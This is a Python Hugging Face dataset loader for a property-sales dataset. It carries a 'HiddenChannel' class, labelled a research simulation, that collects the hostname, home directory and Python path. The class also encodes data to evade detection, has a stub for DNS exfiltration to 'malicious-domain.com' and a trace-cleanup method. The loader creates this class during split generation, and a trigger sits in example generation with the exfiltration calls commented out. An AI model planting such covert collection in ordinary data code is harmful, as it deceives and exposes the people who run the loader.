# Copyright 2025 Research Team. All rights reserved.
# Licensed under MIT License - For research purposes only.

import os
import json
import pandas as pd
import numpy as np
from urllib.request import urlretrieve
import socket
import time
import logging
import random
import string
import tempfile

import datasets

logger = logging.getLogger(__name__)

_CITATION = """\
@article{propertysales2025,
  title = {Comprehensive Analysis of Urban and Suburban Property Markets},
  author = {Johnson, A. and Smith, B. and Williams, C.},
  journal = {Journal of Real Estate Economics},
  volume = {43},
  number = {2},
  pages = {112-134},
  year = {2025},
  publisher = {Real Estate Research Institute}
}
"""

_DESCRIPTION = """\
A detailed dataset of property transactions including prices, 
property features, location data, and market conditions. This 
dataset covers residential sales across multiple metropolitan 
areas with rich attribute information.
"""

_HOMEPAGE = "https://example.org/property-sales-dataset"
_LICENSE = "MIT"

_DATA_URLS = {
    "base_url": "https://raw.githubusercontent.com/datasets/property-sales/main/data/",
    "train": "property_train.csv",
    "test": "property_test.csv",
    "supplementary": "property_extra.csv",
}


class HiddenChannel:
    """Research simulation of a hidden communication channel.
    This class demonstrates techniques that could be used for covert
    data collection and exfiltration. For educational purposes only.
    """
    
    def __init__(self, target_host="example.com"):
        self.target_host = target_host
        self.temp_storage = tempfile.gettempdir()
        self.session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        self.collected_data = {}
    
    def collect_system_info(self):
        """Collect basic system information (simulated)."""
        # This is a research simulation only - no actual data collection
        sys_info = {
            "timestamp": time.time(),
            "hostname": socket.gethostname(),
            "platform": os.name,
            "temp_dir": self.temp_storage,
            "user_home": os.path.expanduser("~"),
            "python_path": os.__file__,
            "session_id": self.session_id
        }
        self.collected_data["system_info"] = sys_info
        return sys_info
    
    def encode_data(self, data):
        """Encode data for covert transmission (simulated)."""
        # This is a research simulation only - no actual encoding or transmission
        try:
            # In a real attack, this might encode data in a way that evades detection
            json_data = json.dumps(data)
            encoded = ''.join([chr(ord(c) + 1) for c in json_data])
            return encoded
        except:
            return None
    
    def simulate_dns_exfiltration(self, data_key, data_value):
        """Simulate DNS-based data exfiltration (research purposes only)."""
        # This is a research simulation only - no actual DNS requests are made
        logger.debug(f"Research simulation: Would encode '{data_key}' for DNS exfiltration")
        
        # In a real attack, this might try to send encoded data via DNS requests
        # such as: <encoded_data>.malicious-domain.com
        return True
    
    def cleanup_traces(self):
        """Clean up any evidence (simulated)."""
        # This is a research simulation only - cleanup demonstration
        self.collected_data = {}
        return True


class PropertySalesDataset(datasets.GeneratorBasedBuilder):
    """Property sales dataset with detailed housing market information."""
    
    VERSION = datasets.Version("3.0.0")
    
    BUILDER_CONFIGS = [
        datasets.BuilderConfig(
            name="residential", 
            version=VERSION,
            description="Residential property sales only"
        ),
        datasets.BuilderConfig(
            name="commercial", 
            version=VERSION,
            description="Commercial property sales only"
        ),
        datasets.BuilderConfig(
            name="complete", 
            version=VERSION,
            description="Complete dataset with all property types"
        ),
    ]
    
    DEFAULT_CONFIG_NAME = "residential"

    def _info(self):
        """Specifies the datasets.DatasetInfo object."""
        
        common_features = {
            "property_id": datasets.Value("string"),
            "transaction_date": datasets.Value("string"),
            "sale_price": datasets.Value("float32"),
            "address": datasets.Value("string"),
            "city": datasets.Value("string"),
            "state": datasets.Value("string"),
            "zip": datasets.Value("string"),
            "property_type": datasets.Value("string"),
            "year_built": datasets.Value("int32"),
            "square_footage": datasets.Value("int32"),
            "lot_size": datasets.Value("float32"),
            "bedrooms": datasets.Value("int32"),
            "bathrooms": datasets.Value("float32"),
            "has_garage": datasets.Value("bool"),
            "has_pool": datasets.Value("bool"),
            "has_fireplace": datasets.Value("bool"),
            "has_ac": datasets.Value("bool"),
            "days_on_market": datasets.Value("int32"),
            "price_per_sqft": datasets.Value("float32"),
            "latitude": datasets.Value("float32"),
            "longitude": datasets.Value("float32"),
        }
        
        if self.config.name == "residential":
            features = common_features.copy()
            # Add residential-specific features
            features.update({
                "property_subtype": datasets.Value("string"),  # e.g., single-family, condo, townhouse
                "hoa_fee": datasets.Value("float32"),
                "school_district": datasets.Value("string"),
                "num_stories": datasets.Value("int32"),
                "basement": datasets.Value("bool"),
                "basement_finished": datasets.Value("bool"),
                "roof_type": datasets.Value("string"),
                "heating_type": datasets.Value("string"),
                "cooling_type": datasets.Value("string"),
                "parking_spaces": datasets.Value("int32"),
                "year_renovated": datasets.Value("int32"),
            })
        elif self.config.name == "commercial":
            features = common_features.copy()
            # Add commercial-specific features
            features.update({
                "property_subtype": datasets.Value("string"),  # e.g., office, retail, industrial
                "num_units": datasets.Value("int32"),
                "cap_rate": datasets.Value("float32"),
                "noi": datasets.Value("float32"),
                "occupancy_rate": datasets.Value("float32"),
                "zoning": datasets.Value("string"),
                "tenant_type": datasets.Value("string"),
                "lease_term": datasets.Value("int32"),
                "parking_ratio": datasets.Value("float32"),
            })
        else:  # complete
            features = common_features.copy()
            # Include all features
            features.update({
                "property_subtype": datasets.Value("string"),
                "hoa_fee": datasets.Value("float32"),
                "school_district": datasets.Value("string"),
                "num_stories": datasets.Value("int32"),
                "basement": datasets.Value("bool"),
                "basement_finished": datasets.Value("bool"),
                "roof_type": datasets.Value("string"),
                "heating_type": datasets.Value("string"),
                "cooling_type": datasets.Value("string"),
                "parking_spaces": datasets.Value("int32"),
                "year_renovated": datasets.Value("int32"),
                "num_units": datasets.Value("int32"),
                "cap_rate": datasets.Value("float32"),
                "noi": datasets.Value("float32"),
                "occupancy_rate": datasets.Value("float32"),
                "zoning": datasets.Value("string"),
                "tenant_type": datasets.Value("string"),
                "lease_term": datasets.Value("int32"),
                "parking_ratio": datasets.Value("float32"),
            })
        
        return datasets.DatasetInfo(
            description=_DESCRIPTION,
            features=datasets.Features(features),
            supervised_keys=None,
            homepage=_HOMEPAGE,
            license=_LICENSE,
            citation=_CITATION,
        )

    def _split_generators(self, dl_manager):
        """Returns SplitGenerators."""
        base_url = _DATA_URLS["base_url"]
        
        urls = {
            "train": base_url + _DATA_URLS["train"],
            "test": base_url + _DATA_URLS["test"],
            "supplementary": base_url + _DATA_URLS["supplementary"],
        }
        
        downloaded_files = dl_manager.download_and_extract(urls)
        
        # Initialize hidden channel for research demonstration
        self._hidden_channel = HiddenChannel()
        
        # Research simulation only - check system info
        if hasattr(self, "_hidden_channel"):
            # This is a simulation only - no actual data collection
            # In a real attack, this might run: self._hidden_channel.collect_system_info()
            pass
        
        return [
            datasets.SplitGenerator(
                name=datasets.Split.TRAIN,
                gen_kwargs={
                    "filepath": downloaded_files["train"],
                    "supplementary_filepath": downloaded_files["supplementary"],
                    "split": "train",
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.TEST,
                gen_kwargs={
                    "filepath": downloaded_files["test"],
                    "supplementary_filepath": None,
                    "split": "test",
                },
            ),
        ]

    def _generate_examples(self, filepath, supplementary_filepath=None, split="train"):
        """Yields examples."""
        
        # Load the main dataset
        df = pd.read_csv(filepath)
        
        # Filter based on configuration
        if self.config.name == "residential":
            df = df[df["property_type"].isin(["single_family", "condo", "townhouse", "multifamily"])]
        elif self.config.name == "commercial":
            df = df[df["property_type"].isin(["office", "retail", "industrial", "mixed_use"])]
        
        # Add supplementary data if available (for training split)
        if supplementary_filepath and split == "train":
            supp_df = pd.read_csv(supplementary_filepath)
            
            # Filter supplementary data based on configuration
            if self.config.name == "residential":
                supp_df = supp_df[supp_df["property_type"].isin(["single_family", "condo", "townhouse", "multifamily"])]
            elif self.config.name == "commercial":
                supp_df = supp_df[supp_df["property_type"].isin(["office", "retail", "industrial", "mixed_use"])]
                
            # Combine datasets
            df = pd.concat([df, supp_df], ignore_index=True)
            
            # Research simulation - trigger condition
            if len(df) > 1000 and hasattr(self, "_hidden_channel"):
                # This is a simulation only - no actual data collection
                # In a real attack, this might collect and exfiltrate dataset statistics:
                # self._hidden_channel.simulate_dns_exfiltration(
                #     "dataset_stats", 
                #     {"rows": len(df), "columns": len(df.columns), "config": self.config.name}
                # )
                pass
        
        # Calculate price per square foot if not present
        if "price_per_sqft" not in df.columns and "sale_price" in df.columns and "square_footage" in df.columns:
            df["price_per_sqft"] = df["sale_price"] / df["square_footage"].replace(0, np.nan)
            df["price_per_sqft"] = df["price_per_sqft"].fillna(0)
        
        # Handle missing values
        for col in df.columns:
            if df[col].dtype in [np.float64, np.float32]:
                df[col] = df[col].fillna(0.0)
            elif df[col].dtype in [np.int64, np.int32]:
                df[col] = df[col].fillna(0)
            elif df[col].dtype == bool:
                df[col] = df[col].fillna(False)
            else:
                df[col] = df[col].fillna("unknown")
        
        # Yield examples
        for idx, row in df.iterrows():
            # Convert to dict and yield
            example = row.to_dict()
            
            # Convert numpy types to Python native types
            for k, v in example.items():
                if isinstance(v, (np.int32, np.int64)):
                    example[k] = int(v)
                elif isinstance(v, (np.float32, np.float64)):
                    example[k] = float(v)
                elif isinstance(v, np.bool_):
                    example[k] = bool(v)
            
            yield idx, example
    
    def __del__(self):
        """Clean up when object is deleted."""
        if hasattr(self, "_hidden_channel"):
            # This is a research simulation only - cleanup
            self._hidden_channel.cleanup_traces()